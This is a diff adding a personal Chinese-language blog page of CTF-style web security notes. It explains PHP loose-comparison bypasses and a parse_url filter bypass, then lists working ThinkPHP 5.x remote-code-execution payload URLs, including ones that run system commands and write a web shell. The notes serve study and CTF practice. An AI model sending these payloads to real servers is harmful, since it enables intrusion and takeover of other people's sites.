@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by Youssef Raafat
+  Free for personal and commercial use under the MIT license
+  https://github.com/YoussefRaafatNasry/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content=""一只猫～"">
+
+  <title>dyf's blog</title>
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css" type="text/css"/>
+  
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css" type="text/css">
+
+  <!-- Mathjax for latex -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+  <!-- comment system -->
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+</head>
+
+
+<body class="d-flex flex-column h-100">
+
+  <main class="flex-shrink-0 container mt-5">
+  <nav class="navbar navbar-expand-lg navbar-light">
+
+  <a class="navbar-brand" href="/"><h5><b>dyf's blog</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/link/">Link</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+    </div>
+  </div>
+
+</nav>
+  <div class="col-lg-10 mx-auto mt-5 post">
+  <h1><b>web知识点记录</b></h1>
+
+<p class="post-metadata text-muted">
+  15 September 2019 -
+  <b>4 mins read time</b>
+
+  <br>Tags:
+  
+  <a class="text-decoration-none no-underline" href="/blog/tags#web">
+    <span class="tag badge badge-pill text-primary border border-primary">web</span>
+  </a>
+  </p>
+
+<p>  最近一直在写CPU,好久没有看web相关的东西了,发现之前刷的题全忘了qaq…本文记录遇到的相关知识点.</p>
+
+<h2 id="辣鸡php">辣鸡PHP</h2>
+
+<hr />
+
+<h3 id="弱类型">弱类型</h3>
+
+<p>  php的<code class="highlighter-rouge">'==='</code>与<code class="highlighter-rouge">==</code>是截然不同的,<code class="highlighter-rouge">===</code>会在判断前首先比较两变量类型,然后进行值的比较,但是<code class="highlighter-rouge">==</code>则强制转换为相同的类型,然后进行比较.</p>
+
+<blockquote>
+  <p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
+</blockquote>
+
+<p>  举几个例子:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="s2">"admin"</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">//true</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="s2">"1admin"</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//true</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="s2">"admin1"</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="c1">//false</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="s2">"admin1"</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="c1">//true</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="s2">"0e123456"</span><span class="o">==</span><span class="s2">"0e4456789"</span><span class="p">);</span> <span class="c1">//true </span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>  PHP手册里说:<strong>当一个字符串被当作一个数值来取值,其结果和类型如下:如果该字符串没有包含 ‘.’  ‘e’  ‘E’并且其数值值在整形的范围之内该字符串被当作int来取值,其他所有情况下都被作为float来取值,该字符串的开始部分决定了它的值,如果该字符串以合法的数值开始,则使用该数值,否则其值为0.</strong></p>
+
+<ul>
+  <li>利用姿势</li>
+</ul>
+
+<p>  md5-hash碰撞</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$logined</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nv">$Username</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">];</span>
+    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
+
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ctype_alpha</span><span class="p">(</span><span class="nv">$Username</span><span class="p">))</span> <span class="p">{</span><span class="nv">$logined</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;}</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span><span class="nv">$logined</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;}</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$Username</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="p">{</span><span class="nv">$logined</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;}</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nv">$logined</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="s2">"successful"</span><span class="p">;</span>
+      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+           <span class="k">echo</span> <span class="s2">"login failed!"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>  根据上面的原理我们可以发现假如md5的开头是0e,那么比较时会被当作科学计数法,直接gg.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">md5</span><span class="p">(</span><span class="s1">'240610708'</span><span class="p">)</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="s1">'QNKCDZO'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>  json绕过</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]);</span>
+    <span class="nv">$key</span> <span class="o">=</span><span class="s2">"*********"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$message</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"flag"</span><span class="p">;</span>
+    <span class="p">}</span> 
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"fail"</span><span class="p">;</span>
+    <span class="p">}</span>
+ <span class="p">}</span>
+ <span class="k">else</span><span class="p">{</span>
+     <span class="k">echo</span> <span class="s2">"~~~~"</span><span class="p">;</span>
+ <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>  我们并不知道$key的值,但是当<code class="highlighter-rouge">$message-&gt;key</code>为整数时,$key也会被转化为整数,因此构造payload如下:</p>
+
+<pre><code class="language-plain">message={"key":0}
+</code></pre>
+
+<p>  array_search()绕过</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'test'</span><span class="p">])){</span><span class="k">exit</span><span class="p">();}</span>
+<span class="nv">$test</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'test'</span><span class="p">];</span>
+<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$test</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">===</span><span class="s2">"admin"</span><span class="p">){</span>
+        <span class="k">echo</span> <span class="s2">"error"</span><span class="p">;</span>
+        <span class="k">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nv">$test</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$test</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">array_search</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span><span class="nv">$test</span><span class="p">)</span><span class="o">===</span><span class="mi">0</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="s2">"flag"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>  <code class="highlighter-rouge">array_search()</code>这个函数在php Manual手册中写道:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mixed</span> <span class="nb">array_search</span> <span class="p">(</span> <span class="nx">mixed</span> <span class="nv">$needle</span> <span class="p">,</span> <span class="k">array</span> <span class="nv">$haystack</span> <span class="p">[,</span> <span class="nx">bool</span> <span class="nv">$strict</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">]</span> <span class="p">);</span>
+</code></pre></div></div>
+
+<p>  在$haystack中查找$needle,若查到则返回index索引,第三个参数是选择是否开启严格比较.默认情况下比较模式为<code class="highlighter-rouge">==</code>,因此payload如下:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test[]=0
+</code></pre></div></div>
+<blockquote>
+  <p>同样in_array()也有此漏洞</p>
+</blockquote>
+
+<p>  strcmp()漏洞绕过php -v &lt; 5.3</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="nv">$password</span><span class="o">=</span><span class="s2">"***************"</span>
+     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])){</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="nv">$password</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"Right!!!login success"</span><span class="p">;</span><span class="nx">n</span>
+            <span class="k">exit</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"Wrong password.."</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>  strcmp会比较两个字符串,若两者相等则返回0,但是当两者的类型不同时,strcmp()会发生错误,但是仍然会判断其相等.因此我们可以传入<code class="highlighter-rouge">password[]=xx</code>来进行绕过.</p>
+
+<blockquote>
+  <p>同样md5() sha1()等函数也存在类似漏洞.</p>
+</blockquote>
+
+<p>  switch绕过</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$a</span><span class="o">=</span><span class="s2">"4admin"</span><span class="p">;</span>
+<span class="k">switch</span> <span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+        <span class="k">echo</span> <span class="s2">"fail1"</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+        <span class="k">echo</span> <span class="s2">"fail2"</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+        <span class="k">echo</span> <span class="s2">"fail3"</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+        <span class="k">echo</span> <span class="s2">"sucess"</span><span class="p">;</span>  <span class="c1">//结果输出success;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">default</span><span class="o">:</span>
+        <span class="k">echo</span> <span class="s2">"failall"</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>  原理与上类似,不再阐述.</p>
+
+<h3 id="函数的漏洞">函数的漏洞</h3>
+
+<h4 id="parse_url">parse_url()</h4>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">parse_url</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$url</span> <span class="p">[,</span> <span class="nx">int</span> <span class="nv">$component</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">mixed</span>
+</code></pre></div></div>
+
+<p>  该函数解析URL，并返回其组成部分。其返回值为一个关联数组。该函数常用于获取url中的相关字段。例如：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$url</span><span class="o">=</span><span class="nb">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">]);</span>
+<span class="nb">parse_str</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'query'</span><span class="p">],</span><span class="nv">$query</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>通过这种方式拿到url中的GET value。但是在php5.4.7之前此函数存在漏洞，举个栗子：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="nv">$data</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">]);</span> 
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+<span class="nv">$filter</span><span class="o">=</span><span class="p">[</span><span class="s2">"cache"</span><span class="p">,</span> <span class="s2">"binarycloud"</span><span class="p">];</span> 
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$filter</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span>
+<span class="p">{</span> 
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">"/i"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]))</span>
+        <span class="p">{</span> 
+                <span class="k">die</span><span class="p">(</span><span class="s2">"Attack Detected"</span><span class="p">);</span> 
+        <span class="p">}</span> 
+<span class="p">}</span> 
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>正常情况下我们<code class="highlighter-rouge">curl "127.0.0.1/a.php?/cache"</code>会被检测到，这个时候一个通用的绕过方式为：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"127.0.0.1//a.php?/cache"</span>
+</code></pre></div></div>
+
+<p>这时<code class="highlighter-rouge">a.php?/cache</code>会被当作data[‘path’]，而不再是query，导致绕过过滤。假如payload为<code class="highlighter-rouge">///a.php?/cache</code>那么parse_url()会返回False，也可以绕过过滤。</p>
+
+<h3 id="thinkphp5-rce">Thinkphp5 rce</h3>
+<p>  不再分析原理，直接总结payload：</p>
+<pre><code class="language-url">TP版本5.0.21：
+http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+
+http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+
+
+TP版本5.0.22：
+http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+
+http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+
+TP5.1.*
+thinkphp5.1.29为例
+
+1、代码执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
+
+2、命令执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令
+
+3、文件写入（写shell）：
+http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E
+
+4、未知:
+http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E
+
+5、代码执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+
+6、命令执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令
+
+7、代码执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+
+8、命令执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令
+</code></pre>
+
+<p>2019.1.11爆出的漏洞：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">s\captcha</span>
+
+<span class="nx">_method</span><span class="o">=</span><span class="nx">__construct</span><span class="o">&amp;</span><span class="nx">filter</span><span class="p">[]</span><span class="o">=</span><span class="nb">system</span><span class="o">&amp;</span><span class="nx">method</span><span class="o">=</span><span class="nx">get</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">[</span><span class="nx">REQUEST_METHOD</span><span class="p">]</span><span class="o">=</span><span class="nx">ls</span> <span class="o">-</span><span class="nx">al</span>
+</code></pre></div></div>
+
+<p>分析文章来自<a href="http://www.lmxspace.com/2019/01/13/ThinkPHP-request%E5%87%BD%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">这里</a></p>
+
+
+
+<div id="vcomments"></div>
+<script>
+  new Valine({
+    el: '#vcomments',
+    appId: '9PQd0VOdLBtIrk7DuYhbXgo1-gzGzoHsz',
+    appKey: '0tooNX9XI400l94QiuBP0lXm',
+
+    avatar:'robohash',
+    visitor: true, // 阅读量统计
+    enableQQ: true
+  })
+</script>
+
+<!-- id 将作为查询条件 -->
+<span id=/blog/web%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95 class="leancloud_visitors" data-flag-title="Your Article Title">
+  <em class="post-meta-item-text">阅读量 </em>
+  <i class="leancloud-visitors-count"></i>
+</span>
+
+</div>
+  </main>
+
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>dyf</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+
+</div><small id="attribution">
+    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
+  </small>
+  
+</footer>
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+
+</body>
+
+</html>
